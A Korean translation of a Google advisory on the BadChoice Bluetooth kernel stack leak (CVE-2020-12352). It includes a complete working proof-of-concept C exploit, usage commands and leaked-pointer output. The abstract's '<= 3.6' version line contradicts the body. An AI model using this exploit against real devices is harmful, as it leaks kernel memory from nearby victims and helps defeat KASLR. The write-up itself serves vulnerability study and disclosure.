# BleedingTooth - BadChoice
본 문서는 구글 보안팀의 [BadChoice 공식 문서](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq)를 번역하며 재구성한 글입니다.

## Abstract
```
CVE: CVE-2020-12352
Severity: Medium
Platform: Linux Kernel <= 3.6
Attack Type: Stack-Based Information Leak
```
본 글에서 다룰 취약점은 BleedingTooth 취약점 중 BadChoice 공격에 대한 내용으로 `CVE-2020-12352`번을 부여받은 취약점이다. 리눅스 커널 3.6 버전 이상에서 적용되며, [47f2d97d3881 커밋](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=47f2d97d38816aaca94c9b6961c6eff1cfcd0bd6)에서 발생해서 [8e2a0d92c56e 커밋](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=8e2a0d92c56ec6955526a8b60838c9b00f70540d)에 수정되었다. 취약점이 발생한 위치는 `net/bluetooth/a2mp.c` 파일이다.

공격자는 피해자의 bd 주소만 알고 있어도 스택 데이터를 탐색할 수 있다. 이는 KASLR을 우회하기 위한 다양한 포인터 정보를 습득할 수도 있고, 암호화 키와 같이 다른 중요한 정보가 포함될 수도 있다. 

## Proof Of Concept
### poc.c
```c++
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

typedef struct {
	uint8_t  code;
	uint8_t  ident;
	uint16_t len;
} __attribute__ ((packed)) amp_mgr_hdr;
#define AMP_MGR_HDR_SIZE 4

#define AMP_INFO_REQ 0x06
typedef struct {
	uint8_t id;
} __attribute__ ((packed)) amp_info_req_parms;

typedef struct {
	uint8_t  mode;
	uint8_t  txwin_size;
	uint8_t  max_transmit;
	uint16_t retrans_timeout;
	uint16_t monitor_timeout;
	uint16_t max_pdu_size;
} __attribute__ ((packed)) l2cap_conf_rfc;

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  printf("[*] Creating AMP channel...\n");
  struct {
    l2cap_hdr hdr;
  } packet1 = {0};
  packet1.hdr.len = htobs(sizeof(packet1) - L2CAP_HDR_SIZE);
  packet1.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_socket, hci_handle, &packet1, sizeof(packet1));

  printf("[*] Configuring to L2CAP_MODE_BASIC...\n");
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } packet2 = {0};
  packet2.hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE);
  packet2.hdr.cid = htobs(1);
  packet2.cmd_hdr.code = L2CAP_CONF_RSP;
  packet2.cmd_hdr.ident = 0x41;
  packet2.cmd_hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet2.conf_rsp.scid = htobs(AMP_MGR_CID);
  packet2.conf_rsp.flags = htobs(0);
  packet2.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  packet2.conf_opt.type = L2CAP_CONF_RFC;
  packet2.conf_opt.len = sizeof(l2cap_conf_rfc);
  packet2.conf_rfc.mode = L2CAP_MODE_BASIC;
  hci_send_acl_data(hci_socket, hci_handle, &packet2, sizeof(packet2));

  printf("[*] Sending malicious AMP info request...\n");
  struct {
    l2cap_hdr hdr;
    amp_mgr_hdr amp_hdr;
    amp_info_req_parms info_req;
  } packet3 = {0};
  packet3.hdr.len = htobs(sizeof(packet3) - L2CAP_HDR_SIZE);
  packet3.hdr.cid = htobs(AMP_MGR_CID);
  packet3.amp_hdr.code = AMP_INFO_REQ;
  packet3.amp_hdr.ident = 0x41;
  packet3.amp_hdr.len = htobs(sizeof(amp_info_req_parms));
  packet3.info_req.id = 0x42; // use a dummy id to make hci_dev_get fail
  hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));

  // Read responses
  for (int i = 0; i < 64; i++) {
    char buf[1024] = {0};
    size_t buf_size = read(hci_socket, buf, sizeof(buf));
    if (buf_size > 0 && buf[0] == HCI_ACLDATA_PKT) {
      l2cap_hdr *l2_hdr = (l2cap_hdr *)(buf + 5);
      if (btohs(l2_hdr->cid) == AMP_MGR_CID) {
        uint64_t leak1 = *(uint64_t *)(buf + 13) & ~0xffff;
        uint64_t leak2 = *(uint64_t *)(buf + 21);
        uint16_t leak3 = *(uint64_t *)(buf + 29);
        printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
        break;
      }
    }
  }

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis
본 취약점은 `A2MP_GETINFO_REQ` 요청에서 잘못된 hci 장치 ID 또는 `HCI_AMP` 유형이 아닌 ID를 지정할 때 발생한다. 응답으로 `a2mp_info_rsp` 구조체를 송신하는데, 구조체가 완전히 초기화되지 않은 상태로 응답하게 되어 스택 데이터가 드러나게 된다.

```c++
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_req *req  = (void *) skb->data;
	struct hci_dev *hdev;
	struct hci_request hreq;
	int err = 0;

	if (le16_to_cpu(hdr->len) < sizeof(*req))
		return -EINVAL;

	BT_DBG("id %d", req->id);

	hdev = hci_dev_get(req->id);
	if (!hdev || hdev->dev_type != HCI_AMP) {
		struct a2mp_info_rsp rsp;

		rsp.id = req->id;
		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
			  &rsp);

		goto done;
	}
	...
}
```
실제로 `a2mp_info_rsp` 구조체는 다음과 같이 구성되어있다.
```c++
struct a2mp_info_rsp {
	__u8	id;
	__u8	status;
	__le32	total_bw;
	__le32	max_bw;
	__le32	min_latency;
	__le16	pal_cap;
	__le16	assoc_size;
} __packed;
```
앞서 설명했듯이 `a2mp_info_rsp`는 스택에 할당되고나서 처음 2바이트만 초기화되므로 나머지 16바이트에는 스택 프레임에 있던 데이터가 노출된다. `a2mp_send_getinfo_rsp()` 함수에도 동일한 취약점이 존재한다.

## Usage
POC를 사용하기 위해 `gcc -o poc poc.c -lbluetooth` 명령으로 아래 코드를 컴파일 할 수 있고, 컴파일된 바이너리는 `sudo ./poc 11:22:33:44:55:66` 명령으로 실행할 수 있다. 첫 번째 실행인자 부분에 공격 대상의 bd 주소를 입력하면 된다.

`Ubuntu 20.04` 에서 실행한 결과는 아래와 같다.
```
[*] Resetting hci0 device...
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Creating AMP channel...
[*] Configuring to L2CAP_MODE_BASIC...
[*] Sending malicious AMP info request...
[+] Leaked: ffffffff98e00000, ffffffff98e001a4, 1229
```